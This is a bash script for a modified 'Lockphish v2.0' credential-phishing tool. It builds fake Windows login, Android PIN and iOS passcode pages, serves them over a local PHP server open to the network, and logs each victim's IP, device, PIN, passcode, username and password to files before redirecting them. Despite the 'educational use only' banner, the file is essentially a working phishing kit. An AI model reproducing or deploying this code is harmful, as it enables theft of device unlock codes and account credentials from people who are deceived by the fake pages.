#!/bin/bash
# Lockphish v2.0 Modified for Localhost
# Modified by Wasif

trap 'printf "\n";stop' 2

banner() {
printf "\n"
printf "\e[1;92m╔══════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;92m║                                                        ║\e[0m\n"
printf "\e[1;92m║   ██╗    ██╗  █████╗ ███████╗██╗███████╗                ║\e[0m\n"
printf "\e[1;92m║   ██║    ██║. ██╔══██╗██╔════╝██║██╔════╝                ║\e[0m\n"
printf "\e[1;92m║   ██║ █ ██║███████║███████╗██║█████╗                  ║\e[0m\n"
printf "\e[1;92m║   ██║███╗██║██╔══██║╚════██║██║██╔══╝                  ║\e[0m\n"
printf "\e[1;92m║   ╚███╔███╔╝██║  ██║███████║██║███████╗                ║\e[0m\n"
printf "\e[1;92m║    ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝╚══════╝                ║\e[0m\n"
printf "\e[1;92m║                                                        ║\e[0m\n"
printf "\e[1;92m║             L O C K P H I S H   v2.0                    ║\e[0m\n"
printf "\e[1;92m║              [ Localhost Edition ]                      ║\e[0m\n"
printf "\e[1;92m║                                                        ║\e[0m\n"
printf "\e[1;92m╚══════════════════════════════════════════════════════════╝\e[0m\n"
printf "\n"
printf "                 \e[1;77mCoded by: \e[1;92mWASIF\e[0m\n"
printf "\n"
printf "\e[1;91m══════════════════════════════════════════════════════════\e[0m\n"
printf "\e[1;91m WARNING: For Educational and Authorized Testing Only!   \e[0m\n"
printf "\e[1;91m Use only with explicit permission from target.          \e[0m\n"
printf "\e[1;91m Unauthorized access is illegal and unethical!           \e[0m\n"
printf "\e[1;91m══════════════════════════════════════════════════════════\e[0m\n"
printf "\n"
}

stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
exit 1
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m╔══════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;92m║                      LISTENING MODE                     ║\e[0m\n"
printf "\e[1;92m╚══════════════════════════════════════════════════════════╝\e[0m\n"
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Server Active on:\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Local URL:     \e[0m\e[1;77mhttp://localhost:3333\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Network URL:   \e[0m\e[1;77mhttp://$(hostname -I | awk '{print $1}'):3333\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press \e[0m\e[1;91mCtrl + C\e[0m\e[1;92m to stop server\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\n"

while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m╔══════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;92m║                    TARGET CONNECTED!                     ║\e[0m\n"
printf "\e[1;92m╚══════════════════════════════════════════════════════════╝\e[0m\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

if [[ -e "pin.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Android PIN received!\e[0m\n"
pin=$(tail -n1 pin.txt)
printf "\e[1;92m[\e[0m+\e[1;92m] PIN:\e[0m\e[1;77m %s\e[0m\n" $pin
printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m pin.saved.txt\e[0m\n"
cat pin.txt >> pin.saved.txt
rm -rf pin.txt
fi

if [[ -e "passwords.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Windows credentials received!\e[0m\n"
username=$(tail -n1 usernames.txt)
password=$(tail -n1 passwords.txt)
printf "\e[1;92m[\e[0m+\e[1;92m] Username:\e[0m\e[1;77m %s\e[0m\n" $username
printf "\e[1;92m[\e[0m+\e[1;92m] Password:\e[0m\e[1;77m %s\e[0m\n" $password
printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m win.saved.txt\e[0m\n"
cat usernames.txt >> win.saved.txt
cat passwords.txt >> win.saved.txt
rm -rf usernames.txt
rm -rf passwords.txt
fi

if [[ -e "passcode.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] iOS passcode received!\e[0m\n"
passcode=$(tail -n1 passcode.txt)
printf "\e[1;92m[\e[0m+\e[1;92m] Passcode:\e[0m\e[1;77m  %s\e[0m\n" $passcode
printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m  passcode.txt\e[0m\n"
cat passcode.txt >> passcode.saved.txt
rm -rf passcode.txt
fi

sleep 0.5
done 
}

localhost_server() {
printf "\n\e[1;92m╔══════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;92m║                  STARTING LOCAL SERVER                   ║\e[0m\n"
printf "\e[1;92m╚══════════════════════════════════════════════════════════╝\e[0m\n\n"

# Build the phishing pages for localhost
build_local_pages

# Kill any existing process on port 3333
fuser -k 3333/tcp > /dev/null 2>&1

# Start PHP server
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 3333...\e[0m\n"
php -S 0.0.0.0:3333 > /dev/null 2>&1 &
sleep 2

printf "\e[1;92m[\e[0m✓\e[1;92m] Server started successfully!\e[0m\n"
printf "\e[1;92m[\e[0m✓\e[1;92m] Local URL:     \e[0m\e[1;77mhttp://localhost:3333\e[0m\n"
printf "\e[1;92m[\e[0m✓\e[1;92m] Network URL:   \e[0m\e[1;77mhttp://$(hostname -I | awk '{print $1}'):3333\e[0m\n"
printf "\e[1;92m[\e[0m✓\e[1;92m] Developer:     \e[0m\e[1;77mWasif\e[0m\n\n"
}

build_local_pages() {
url=$redirect
local_link="http://localhost:3333"
payload_name="index"

printf "\e[1;92m[\e[0m+\e[1;92m] Building phishing pages...\e[0m\n"

# Create necessary PHP files
sed 's+forwarding_url+'$url'+g' post.php > cat.php

# Create HTML pages with localhost links
sed 's+forwarding_link+'$local_link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
sed 's+forwarding_link+'$local_link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
sed 's+forwarding_link+'$local_link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html

# Create base64 encoded payload for template
IFS=$'\n'
data_base64=$(base64 -w 0 win2.html)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

# Create main index page
sed 's+forwarding_link+'$local_link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html

printf "\e[1;92m[\e[0m✓\e[1;92m] Pages built successfully!\e[0m\n"
}

redirect() {
default_redirect="https://www.youtube.com"
printf "\n\e[1;92m╔══════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;92m    ║                  REDIRECTION SETTINGS                    ║\e[0m\n"
printf "\e[1;92m.   ╚══════════════════════════════════════════════════════════╝\e[0m\n\n"
printf "\e[1;92m[\e[0m?\e[1;92m] Enter redirect URL after phishing\e[0m\n"
printf "\e[1;92m[\e[0m?\e[1;92m] Default: \e[0m\e[1;77mYouTube\e[0m\n"
printf "\e[1;92m[\e[0m?\e[1;92m] Press Enter for default\e[0m\n"
printf "\n\e[1;92mRedirect URL: \e[0m"
read redirect
redirect="${redirect:-${default_redirect}}"
printf "\e[1;92m[\e[0m✓\e[1;92m] Redirect set to: \e[0m\e[1;77m%s\e[0m\n\n" "$redirect"
}

